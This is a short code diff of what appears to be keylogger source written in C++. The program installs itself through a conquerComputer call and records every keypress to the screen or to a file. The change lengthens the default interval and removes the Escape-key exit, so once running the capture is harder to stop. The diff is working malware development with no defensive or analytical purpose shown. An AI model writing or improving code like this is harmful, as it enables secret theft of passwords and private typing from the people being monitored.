@@ -70,7 +70,7 @@ int main(int argc, char **argv)
         conquerComputer(installPath.c_str());
     }
 
-    int timeInterval = 60;
+    int timeInterval = 20 * 60;
     if(args >> GetOpt::OptionPresent('t', "time"))
     {
         args >> GetOpt::Option('t', "time", timeInterval, 60);
@@ -93,8 +93,6 @@ int main(int argc, char **argv)
             if(eve.value == KEY_PRESS)
                 keyWord = std::string(getKey(eve.code, shiftPressed, capsActive));
         }
-        if(eve.type == EV_KEY && eve.code == 1)
-            break;
         if(isStdOut && eve.value == KEY_PRESS && eve.type == EV_KEY)
             std::cout << keyWord << std::endl;
         if(isFile && eve.value == KEY_PRESS && eve.type == EV_KEY)
